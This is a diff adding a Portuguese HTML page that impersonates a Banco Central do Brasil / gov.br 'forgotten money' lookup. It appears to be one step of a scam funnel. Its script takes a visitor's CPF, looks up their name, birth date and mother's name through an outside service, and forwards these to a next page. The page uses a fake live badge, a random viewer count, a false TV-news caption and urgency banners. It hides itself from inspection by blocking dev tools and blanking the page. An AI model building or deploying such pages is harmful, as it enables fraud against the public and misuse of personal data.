@@ -1,0 +1,399 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <!-- Performance & Otimização -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="theme-color" content="#1a1f8c">
+<meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Consultando seus dados</title>
+  <!-- Open Graph -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Consulta de Benefícios — Banco Central do Brasil">
+  <meta property="og:description" content="Verifique seus benefícios disponíveis para saque.">
+  <meta property="og:image" content="https://brasilconsulta.org/wp-content/uploads/2026/02/og-image.jpg">
+  <meta property="og:locale" content="pt_BR">
+  <meta name="twitter:card" content="summary">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{min-height:100vh;background:#fff;font-family:Raleway,sans-serif;display:flex;flex-direction:column;max-width:480px;margin:0 auto}
+.topo{background:#fff;text-align:center}
+.topo-card{background:#fff;border:1px solid #ddd;border-top:none;border-radius:0 0 22px 22px;padding:18px 52px 20px;display:inline-block;text-align:center}
+.content{background:#fff;flex:1;padding:24px 20px}
+h2{color:#1a1f8c;font-size:22px;font-weight:800;text-align:center;margin-bottom:8px}
+.sub{color:#555;font-size:14px;text-align:center;line-height:1.7;margin-bottom:18px}
+
+/* VIDEO */
+.main-card{border:1px solid #e0e0e0;border-radius:14px;overflow:hidden;margin-bottom:20px}
+/* NOVO PLAYER CSS */
+.player { position: relative; width: 100%; max-width: 866px; aspect-ratio: 866/480; background: #000; border-radius: 14px 14px 0 0; overflow: hidden; margin: 0 auto; }
+.player video { width: 100%; height: 100%; object-fit: cover; pointer-events: none; }
+.badge-area { position: absolute; top: 12px; left: 12px; z-index: 35; display: flex; align-items: center; gap: 8px; }
+.badge-live { display: flex; align-items: center; gap: 6px; background: #dc2626; color: #fff; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; padding: 4px 10px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,.3); }
+.dot-wrap { position: relative; width: 8px; height: 8px; }
+.dot-ping { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: #fff; opacity: .75; animation: ping 1s cubic-bezier(0,.5,.5,1) infinite; }
+.dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; position: relative; }
+.badge-viewers { display: flex; align-items: center; gap: 4px; background: rgba(0,0,0,.6); backdrop-filter: blur(4px); padding: 4px 8px; border-radius: 4px; color: #fff; font-size: 12px; font-weight: 600; }
+.badge-viewers svg { width: 12px; height: 12px; color: #d1d5db; }
+.overlay-unmute { position: absolute; inset: 0; z-index: 20; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,.45); cursor: pointer; }
+.unmute-circle { width: 72px; height: 72px; border-radius: 50%; background: rgba(255,255,255,.85); display: flex; align-items: center; justify-content: center; box-shadow: 0 20px 40px rgba(0,0,0,.3); margin-bottom: 16px; }
+.unmute-circle svg { width: 32px; height: 32px; color: #374151; }
+.overlay-unmute h3 { font-size: 20px; font-weight: 700; color: #fff; margin-bottom: 4px; }
+.overlay-unmute p { font-size: 14px; color: rgba(255,255,255,.7); }
+.overlay-pause { position: absolute; inset: 0; z-index: 40; display: none; align-items: center; justify-content: center; background: rgba(0,0,0,.7); }
+.overlay-pause.active { display: flex; }
+.pause-card { margin: 0 16px; max-width: 28rem; border-radius: 16px; border: 1px solid rgba(234,179,8,.3); background: linear-gradient(to bottom, #0d1b3e, #091228); padding: 24px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,.3); }
+.pause-card .emoji { font-size: 2.25rem; margin-bottom: 12px; }
+.pause-card h2 { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+.pause-card p { font-size: 14px; line-height: 1.6; color: #d1d5db; margin-bottom: 20px; }
+.pause-card .hl { font-weight: 600; color: #facc15; }
+.btn-resume { display: inline-flex; align-items: center; gap: 8px; background: linear-gradient(to right, #2563eb, #3b82f6); color: #fff; font-size: 14px; font-weight: 600; padding: 12px 24px; border-radius: 9999px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(59,130,246,.3); transition: transform .15s; }
+.btn-resume:hover { transform: scale(1.05); }
+.btn-resume:active { transform: scale(.95); }
+.btn-resume svg { width: 16px; height: 16px; }
+.click-layer { position: absolute; inset: 0; z-index: 10; cursor: pointer; }
+.controls { position: absolute; bottom: 0; left: 0; right: 0; z-index: 30; display: flex; align-items: center; gap: 12px; padding: 12px 16px; background: linear-gradient(to top, rgba(0,0,0,.8), transparent); transition: opacity .3s; }
+.controls.hidden { opacity: 0; pointer-events: none; }
+.controls button { background: none; border: none; color: #fff; cursor: pointer; display: flex; align-items: center; }
+.controls button:hover { color: #60a5fa; }
+.controls .spacer { flex: 1; }
+.vol-slider { height: 4px; width: 80px; cursor: pointer; appearance: none; border-radius: 9999px; background: rgba(255,255,255,.3); accent-color: #3b82f6; }
+.ticker-wrap { position: absolute; bottom: 48px; left: 0; right: 0; z-index: 29; overflow: hidden; }
+.ticker-bar { display: flex; align-items: center; background: rgba(185,28,28,.9); height: 28px; }
+.ticker-label { background: #fff; color: #b91c1c; font-weight: 700; font-size: 12px; padding: 4px 12px; text-transform: uppercase; letter-spacing: .05em; flex-shrink: 0; }
+.ticker-scroll { overflow: hidden; flex: 1; }
+.ticker-text { white-space: nowrap; color: #fff; font-size: 12px; font-weight: 500; padding-left: 16px; animation: ticker 30s linear infinite; }
+@keyframes ping { 75%, 100% { transform: scale(2); opacity: 0; } }
+@keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+
+/* BARRA */
+.prog-wrap{padding:10px 14px 0;background:#fff}
+.prog-bg{background:#e0e0e0;border-radius:99px;height:6px;overflow:hidden}
+.prog-bar{background:#1a1f8c;height:6px;border-radius:99px;width:0%;transition:width 0.3s linear}
+.status-txt{padding:8px 14px 4px;text-align:center;color:#888;font-size:13px;font-style:italic}
+.video-caption{color:#aaa;font-size:12px;text-align:center;padding:4px 0 10px}
+
+/* DADOS */
+.dados-wrap{padding:4px 16px 16px}
+.dado-item{display:flex;align-items:center;gap:14px;padding:11px 0;border-bottom:1px solid #eef0f8}
+.dado-item:last-child{border-bottom:none}
+.dado-icon{width:26px;text-align:center;flex-shrink:0}
+.dado-txt{font-size:15px;color:#222;font-weight:500}
+.dado-txt.dim{color:#aaa}
+
+/* BOTAO */
+.btn-resultado{width:100%;background:#22a861;color:#fff;border:none;border-radius:50px;padding:20px;font-size:17px;font-weight:700;cursor:pointer;font-family:Raleway,sans-serif;display:none;margin-top:4px}
+.btn-resultado.show{display:block}
+
+.footer{background:#fff;border-top:1px solid #e8e8e8;padding:16px;text-align:center;margin-top:auto}
+.footer img{height:32px;width:auto}
+</style>
+  <!-- Utmify -->
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <!-- Whos Amung Us -->
+  <script id="_wauwn5jof" async="" src="js/p2.js"></script>
+ 
+
+
+
+<script>
+  window.pixelId = "664ee353f1b7ad75c57d286e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+</head>
+<body>
+
+<div class="topo">
+  <div class="topo-card"><svg xmlns="http://www.w3.org/2000/svg" width="90" height="51" viewBox="0 0 65 36.174"><path id="logo-bcb" d="M39.577,27.84h1.356l-.049-3.748h.025l1.923,3.748h1.8v-5.5H43.3l.025,3.723H43.3l-1.849-3.723H39.577v5.5Zm7.077,0h1.455V23.426h1.356V22.341H45.3v1.085h1.356Zm3.477,0h1.455V25.67h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208V25.1a1.294,1.294,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H50.106l.025,5.5Zm1.455-4.463h.395c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641h-.395V23.376ZM4.611,27.84h1.48l.444-1.184H8.606l.419,1.184H10.6l-2.121-5.5h-1.8C6.707,22.341,4.611,27.84,4.611,27.84ZM8.261,25.62H6.88l.715-2.145H7.62l.641,2.145ZM0,27.84H2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406H0v5.5ZM1.455,25.5H1.9c.493,0,1.085.049,1.085.666,0,.567-.567.641-1.085.641H1.455Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592H1.455Zm9.494,4.463H12.3l-.049-3.748h.025L14.2,27.84h1.825v-5.5H14.7l.025,3.723H14.7l-1.874-3.723H10.948v5.5Zm10.431-1.282a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.11,6.11,0,0,0-1.627-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.074-1.159Zm.222-1.48a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836,2.54,2.54,0,0,0-2.762-2.836A2.54,2.54,0,0,0,21.6,25.078Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S23.105,25.99,23.105,25.078Zm11.022,1.48a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.289,6.289,0,0,0-1.652-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.049-1.159Zm.74,1.282h3.97V26.8H36.347V25.571h2.269V24.535H36.347V23.4h2.417V22.365H34.892l-.025,5.474Zm20.072,0h1.48l.444-1.184h2.071l.419,1.184h1.6l-2.121-5.5h-1.8l-2.1,5.5Zm3.625-2.219H57.183l.715-2.145h.025Zm2.712,2.219H65V26.755H62.731V22.341H61.277v5.5ZM28.9,19.579h5.5l1.726-1.726h-5.5V14.77h1.036l1.726-1.726H29.245V8.926l-1.726,1.726v1.036H24.437v-5.5L22.711,7.915v5.5h3.107V16.5h3.107v3.082ZM35.089,7.225V3.107l1.726-1.726V5.524h4.118L39.207,7.25ZM30.626,1.381H29.245V5.5h4.118L31.637,7.225H27.519V6.189H25.793V4.808L30.626,0ZM40.933,13.069V11.688h1.381L37.481,16.5H36.1V14.77H35.064V10.653l1.726-1.726v4.143ZM12.181,36.076h2c1.874,0,3.255-.715,3.255-2.762,0-2.121-1.332-2.737-3.255-2.737h-2v5.5Zm1.455-4.414H14.2a1.653,1.653,0,1,1,0,3.3h-.567Zm4.118,1.677a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836A2.54,2.54,0,0,0,20.516,30.5,2.529,2.529,0,0,0,17.754,33.338Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S19.258,34.226,19.258,33.338Zm6.535,2.737h2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406h-2.54v5.5Zm1.48-2.343h.444c.493,0,1.085.049,1.085.641,0,.567-.567.641-1.085.641h-.444V33.733Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592h-.419l.025-1.134Zm3.649,4.463h1.455v-2.17h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208v-.025a1.278,1.278,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H30.9l.025,5.5Zm1.48-4.463H32.8c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641H32.4V31.612Zm3.329,4.463h1.48l.444-1.184H39.7l.419,1.184h1.6l-2.121-5.5H37.8l-2.071,5.5Zm3.649-2.219H38l.715-2.145h.025l.641,2.145Zm7.274,2.219h1.455v-5.5H46.654v5.5Zm2.466,0h3.723V34.991H50.575V30.577H49.12v5.5Zm-7.176-.148a5.323,5.323,0,0,0,1.627.247c1.233,0,2.417-.395,2.417-1.825,0-1.973-2.589-1.381-2.589-2.269,0-.469.616-.518.986-.518a3.06,3.06,0,0,1,1.233.247l.1-1.134a4.017,4.017,0,0,0-1.43-.2c-1.11,0-2.392.37-2.392,1.677,0,2,2.589,1.356,2.589,2.367,0,.444-.444.542-.912.542a3.231,3.231,0,0,1-1.5-.37Z" fill="#025c75" fill-rule="evenodd"></path></svg></div>
+</div>
+
+<div class="content">
+  <h2>Aguarde um momento</h2>
+  <p class="sub">Não saia desta página. Estamos verificando se você possui valores esquecidos a receber no sistema do Banco Central..</p>
+
+  <div class="main-card">
+    <div class="player" id="player" oncontextmenu="return false">
+      <div class="badge-area" id="badgeArea">
+        <div class="badge-live"><span class="dot-wrap"><span class="dot-ping"></span><span class="dot"></span></span>AO VIVO</div>
+        <div class="badge-viewers">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+          <span id="viewerCount">102</span>
+        </div>
+      </div>
+
+      <video id="video" src="media/vsl-consultando.mp4" playsinline preload="auto" muted disablepictureinpicture oncontextmenu="return false"></video>
+
+      <div class="click-layer" id="clickLayer" oncontextmenu="return false"></div>
+
+      <div class="overlay-unmute" id="overlayUnmute">
+        <div class="unmute-circle">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M11 5 6 9H2v6h4l5 4V5Z"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
+        </div>
+        <h3>Clique para ouvir</h3>
+        <p>Ative o som para assistir ao vídeo.</p>
+      </div>
+
+      <div class="overlay-pause" id="overlayPause">
+        <div class="pause-card">
+          <div class="emoji">⚠️</div>
+          <h2>Você está ficando de fora!</h2>
+          <p>Quem para de assistir agora <span class="hl">perde o acesso ao benefício exclusivo</span> revelado no final deste vídeo.</p>
+          <button class="btn-resume" id="btnResume">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+            Continuar Assistindo
+          </button>
+        </div>
+      </div>
+
+      <div class="controls" id="controls">
+        <button id="btnPlay">
+          <svg id="iconPlay" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="none"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+          <svg id="iconPause" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/></svg>
+        </button>
+        <button id="btnMute">
+          <svg id="iconVol" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/></svg>
+          <svg id="iconMute" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M11 5 6 9H2v6h4l5 4V5Z"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/></svg>
+        </button>
+        <input type="range" class="vol-slider" id="volSlider" min="0" max="1" step="0.01" value="0" />
+        <div class="spacer"></div>
+        <button id="btnFs">
+          <svg id="iconExpand" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/></svg>
+          <svg id="iconShrink" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><polyline points="4 14 10 14 10 20"/><polyline points="20 10 14 10 14 4"/><line x1="14" y1="10" x2="21" y2="3"/><line x1="3" y1="21" x2="10" y2="14"/></svg>
+        </button>
+      </div>
+
+      <div class="ticker-wrap" id="tickerWrap"></div>
+    </div>
+
+    <div class="prog-wrap">
+      <div class="prog-bg"><div class="prog-bar" id="progBar" style="width: 1.19048%;"></div></div>
+    </div>
+    <div class="video-caption">Reportagem exibida no Jornal Nacional.</div>
+
+    <div class="dados-wrap">
+      <div class="dado-item">
+        <div class="dado-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg>
+        </div>
+        <div class="dado-txt" id="dadoCpf">...</div>
+      </div>
+      <div class="dado-item">
+        <div class="dado-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        </div>
+        <div class="dado-txt" id="dadoNome">...</div>
+      </div>
+      <div class="dado-item">
+        <div class="dado-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+        </div>
+        <div class="dado-txt" id="dadoNasc">...</div>
+      </div>
+      <div class="dado-item">
+        <div class="dado-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+        </div>
+        <div class="dado-txt" id="dadoMae">Verificando...</div>
+      </div>
+      <div class="dado-item">
+        <div class="dado-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a1f8c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+        </div>
+        <div class="dado-txt dim" id="dadoStatus">Verificando seus dados no sistema...</div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn-resultado" id="btnResultado" onclick="verResultado()">Ver resultado da consulta →</button>
+</div>
+
+<div class="footer">
+  <img src="images/govbr.png" alt="gov.br">
+</div>
+
+<script>
+var params = new URLSearchParams(window.location.search);
+var cpf   = params.get('cpf')   || '';
+var nome  = params.get('nome')  || '';
+var nasc  = params.get('nasc')  || '';
+var mae   = params.get('mae')   || '';
+var valor = params.get('valor') || '';
+
+function fmtCpf(c) {
+  c = c.replace(/\D/g, '');
+  return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+if (cpf)  document.getElementById('dadoCpf').textContent  = fmtCpf(cpf);
+if (nome) document.getElementById('dadoNome').textContent = nome;
+if (nasc) document.getElementById('dadoNasc').textContent = nasc;
+if (mae)  document.getElementById('dadoMae').textContent  = mae;
+
+if (cpf && (!nome || !nasc || !mae)) {
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+    .then(function(r) { return r.json(); })
+    .then(function(d) {
+      if (d.nome)       { document.getElementById('dadoNome').textContent = d.nome; nome = d.nome; }
+      if (d.nascimento) { document.getElementById('dadoNasc').textContent = d.nascimento; nasc = d.nascimento; }
+      if (d.mae)        { document.getElementById('dadoMae').textContent  = d.mae;  mae  = d.mae;  }
+      if (d.valor)      { valor = d.valor; }
+    }).catch(function() {});
+}
+
+(function(){
+  const today = new Date().toLocaleDateString('pt-BR',{day:'2-digit',month:'2-digit',year:'numeric'});
+  const msg = `ATENÇÃO: Benefício liberado hoje (${today}) poderá ajudar milhões de brasileiros. • `;
+
+  const tickerWrap = document.getElementById('tickerWrap');
+  if(tickerWrap){
+    tickerWrap.innerHTML = `<div class="ticker-bar"><span class="ticker-label">Urgente</span><div class="ticker-scroll"><p class="ticker-text">${msg.repeat(8)}</p></div></div>`;
+  }
+
+  const video = document.getElementById('video');
+  const player = document.getElementById('player');
+  const overlayUnmute = document.getElementById('overlayUnmute');
+  const overlayPause = document.getElementById('overlayPause');
+  const clickLayer = document.getElementById('clickLayer');
+  const controls = document.getElementById('controls');
+  const badgeArea = document.getElementById('badgeArea');
+  const btnPlay = document.getElementById('btnPlay');
+  const btnMute = document.getElementById('btnMute');
+  const btnResume = document.getElementById('btnResume');
+  const btnFs = document.getElementById('btnFs');
+  const volSlider = document.getElementById('volSlider');
+  const iconPlay = document.getElementById('iconPlay');
+  const iconPause = document.getElementById('iconPause');
+  const iconVol = document.getElementById('iconVol');
+  const iconMute = document.getElementById('iconMute');
+  const iconExpand = document.getElementById('iconExpand');
+  const iconShrink = document.getElementById('iconShrink');
+  const viewerCount = document.getElementById('viewerCount');
+
+  let started = false, playing = false, paused = false, muted = true, vol = 0.8, hideTimer;
+
+  // Autoplay muted
+  video.muted = true;
+  video.play().then(()=>{ playing=true; updatePlayIcon(); }).catch(()=>{});
+
+  // Viewers
+  let vc = Math.floor(Math.random()*40)+80;
+  if(viewerCount) viewerCount.textContent = vc;
+  setInterval(()=>{ if(viewerCount){vc = Math.max(60,Math.min(150,vc+Math.floor(Math.random()*7)-3)); viewerCount.textContent=vc;} },3000);
+
+  function updatePlayIcon(){ if(!iconPlay)return; iconPlay.style.display=playing?'none':'block'; iconPause.style.display=playing?'block':'none'; }
+  function updateMuteIcon(){ if(!iconVol)return; iconVol.style.display=muted?'none':'block'; iconMute.style.display=muted?'block':'none'; volSlider.value=muted?0:vol; }
+  function updatePauseState(){
+    overlayPause.classList.toggle('active', paused&&started);
+    badgeArea.style.display = paused ? 'none' : 'flex';
+    if(tickerWrap) tickerWrap.style.display = paused ? 'none' : 'block';
+    controls.style.opacity = paused ? '0' : '';
+    controls.style.pointerEvents = paused ? 'none' : '';
+  }
+
+  function resetHideTimer(){ controls.classList.remove('hidden'); clearTimeout(hideTimer); if(playing&&started) hideTimer=setTimeout(()=>controls.classList.add('hidden'),2500); }
+
+  overlayUnmute.addEventListener('click',()=>{
+    started=true; overlayUnmute.style.display='none';
+    video.muted=false; video.volume=0.8; muted=false; updateMuteIcon();
+    if(video.paused){ video.play(); playing=true; paused=false; updatePlayIcon(); }
+    resetHideTimer();
+  });
+
+  function togglePlay(){
+    if(!started) return;
+    if(video.paused){ video.play(); playing=true; paused=false; }
+    else { video.pause(); playing=false; paused=true; }
+    updatePlayIcon(); updatePauseState(); resetHideTimer();
+  }
+
+  clickLayer.addEventListener('click', togglePlay);
+  btnPlay.addEventListener('click',(e)=>{ e.stopPropagation(); togglePlay(); });
+  btnResume.addEventListener('click',(e)=>{ e.stopPropagation(); togglePlay(); });
+
+  btnMute.addEventListener('click',(e)=>{
+    e.stopPropagation();
+    if(muted){ video.muted=false; video.volume=vol||.5; muted=false; if(vol===0) vol=.5; }
+    else { video.muted=true; muted=true; }
+    updateMuteIcon();
+  });
+
+  volSlider.addEventListener('input',(e)=>{
+    e.stopPropagation(); vol=parseFloat(e.target.value); video.volume=vol; muted=vol===0; video.muted=muted; updateMuteIcon();
+  });
+  volSlider.addEventListener('click',(e)=>e.stopPropagation());
+
+  btnFs.addEventListener('click',(e)=>{
+    e.stopPropagation();
+    if(document.fullscreenElement) document.exitFullscreen(); else player.requestFullscreen();
+  });
+  document.addEventListener('fullscreenchange',()=>{
+    const fs=!!document.fullscreenElement;
+    iconExpand.style.display=fs?'none':'block'; iconShrink.style.display=fs?'block':'none';
+  });
+
+  player.addEventListener('mousemove', resetHideTimer);
+
+  video.addEventListener('ended',()=>{ 
+    playing=false; paused=false; started=false; video.muted=true; muted=true; overlayUnmute.style.display=''; updatePlayIcon(); updateMuteIcon(); updatePauseState(); 
+    if(typeof ivBarra04 !== 'undefined') clearInterval(ivBarra04);
+    var progBar = document.getElementById('progBar');
+    if(progBar) progBar.style.width = '100%';
+    const status = document.getElementById('dadoStatus');
+    if(status) { status.textContent = 'Consulta concluída!'; status.classList.remove('dim'); }
+    const btnRes = document.getElementById('btnResultado');
+    if(btnRes) btnRes.classList.add('show');
+  });
+})();
+var progBar      = document.getElementById('progBar');
+
+// Barra inicia automaticamente em 42s — botão aparece ao terminar
+var barW04 = 0;
+var durTotal04 = 42;
+var ivBarra04 = setInterval(function(){
+  barW04 += 100 / (durTotal04 * 2);
+  if(barW04 >= 100){
+    barW04 = 100;
+    clearInterval(ivBarra04);
+    progBar.style.width = '100%';
+    document.getElementById('dadoStatus').textContent = 'Consulta concluída!';
+    document.getElementById('dadoStatus').classList.remove('dim');
+    document.getElementById('btnResultado').classList.add('show');
+    return;
+  }
+  progBar.style.width = barW04 + '%';
+}, 500);
+
+
+
+function verResultado() {
+  var url = '../5/index.html?cpf=' + cpf;
+  if (nome)  url += '&nome='  + encodeURIComponent(nome);
+  if (valor) url += '&valor=' + encodeURIComponent(valor);
+  if (nasc)  url += '&nasc='  + encodeURIComponent(nasc);
+  if (mae)   url += '&mae='   + encodeURIComponent(mae);
+  window.location.href = url;
+}
+</script>
+<script>
+// ── Segurança ──────────────────────────────────────────────────────────────────
+document.addEventListener('contextmenu',function(e){e.preventDefault();});
+document.addEventListener('selectstart',function(e){e.preventDefault();});
+document.addEventListener('dragstart',function(e){e.preventDefault();});
+document.addEventListener('keydown',function(e){
+  if(e.ctrlKey&&['u','U','s','S','i','I','j','J'].indexOf(e.key)>-1){e.preventDefault();return false;}
+  if(e.key==='F12'){e.preventDefault();return false;}
+});
+(function(){try{if(window.self!==window.top&&window.top.location.hostname!==window.self.location.hostname){document.body.style.display='none';}}catch(e){document.body.style.display='none';}})();
+(function(){var t=160;var timer;window.addEventListener('resize',function(){clearTimeout(timer);timer=setTimeout(function(){if(window.outerWidth-window.innerWidth>t&&window.outerHeight-window.innerHeight>t){document.body.innerHTML='';}},300);});})();
+</script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" data-cf-beacon="{" version":"2024.11.0","token":"0da69eb37c66415ea049c7cf62f1578e","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+</body></html>
